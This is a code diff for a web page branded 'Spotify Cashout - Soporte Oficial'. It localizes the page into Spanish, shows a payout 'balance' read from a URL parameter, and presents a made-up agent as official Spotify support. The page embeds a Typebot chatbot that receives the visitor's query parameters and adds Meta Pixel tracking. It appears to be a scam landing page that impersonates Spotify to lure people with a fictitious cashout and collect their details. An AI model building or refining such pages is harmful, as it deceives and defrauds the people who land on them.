@@ -1,13 +1,15 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
 
+const TYPEBOT_URL = "https://typebot.co/type-spotify-pay-es-han5zk7";
+
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "Spotify Cashout - Support" },
-      { name: "description", content: "Spotify Cashout Support" },
-      { property: "og:title", content: "Spotify Cashout - Support" },
-      { property: "og:description", content: "Spotify Cashout Support" },
+      { title: "Spotify Cashout - Soporte" },
+      { name: "description", content: "Soporte Oficial Spotify Cashout" },
+      { property: "og:title", content: "Spotify Cashout - Soporte" },
+      { property: "og:description", content: "Soporte Oficial Spotify Cashout" },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
     ],
@@ -17,12 +19,40 @@ export const Route = createFileRoute("/")({
 
 function Index() {
   const [balance, setBalance] = useState("438.77");
-  const [typebotSrc, setTypebotSrc] = useState(
-    "https://typebot.co/sp-en-u55plu4"
-  );
+  const [typebotSrc, setTypebotSrc] = useState(TYPEBOT_URL);
 
   useEffect(() => {
     if (typeof window !== "undefined") {
+      // --- META PIXEL INITIALIZATION ---
+      if (!(window as any).fbq) {
+        (function (f: any, b: any, e: any, v: any, n?: any, t?: any, s?: any) {
+          if (f.fbq) return;
+          n = f.fbq = function () {
+            n.callMethod
+              ? n.callMethod.apply(n, arguments)
+              : n.queue.push(arguments);
+          };
+          if (!f._fbq) f._fbq = n;
+          n.push = n;
+          n.loaded = !0;
+          n.version = "2.0";
+          n.queue = [];
+          t = b.createElement(e);
+          t.async = !0;
+          t.src = v;
+          s = b.getElementsByTagName(e)[0];
+          s.parentNode.insertBefore(t, s);
+        })(
+          window,
+          document,
+          "script",
+          "https://connect.facebook.net/en_US/fbevents.js"
+        );
+        (window as any).fbq("init", "1439133961480878");
+      }
+      (window as any).fbq("track", "PageView");
+
+      // --- URL PARAMS LOGIC ---
       const params = new URLSearchParams(window.location.search);
       const b = params.get("balance");
       if (b) {
@@ -30,9 +60,7 @@ function Index() {
         setBalance(isNaN(num) ? b : num.toFixed(2));
       }
       if (window.location.search) {
-        setTypebotSrc(
-          `https://typebot.co/sp-en-u55plu4${window.location.search}`
-        );
+        setTypebotSrc(`${TYPEBOT_URL}${window.location.search}`);
       }
     }
   }, []);
@@ -102,16 +130,16 @@ function Index() {
 
               <div className="flex flex-col text-left">
                 <span className="text-[#121212] font-bold text-[15px] leading-tight">
-                  Kaytlynn R.
+                  Isabel R.
                 </span>
                 <span className="text-[#1DB954] font-semibold text-[12px] flex items-center gap-1.5 mt-0.5">
                   <span className="w-2 h-2 rounded-full bg-[#1DB954] inline-block animate-pulse" />
-                  Official Spotify Support
+                  Soporte Oficial de Spotify
                 </span>
               </div>
             </div>
 
-            {/* Embedded Typebot Iframe with Bottom Clip to remove 'Made with Typebot' */}
+            {/* Embedded Typebot Iframe */}
             <div className="flex-1 relative w-full h-full overflow-hidden bg-white min-h-0">
               <iframe
                 src={typebotSrc}
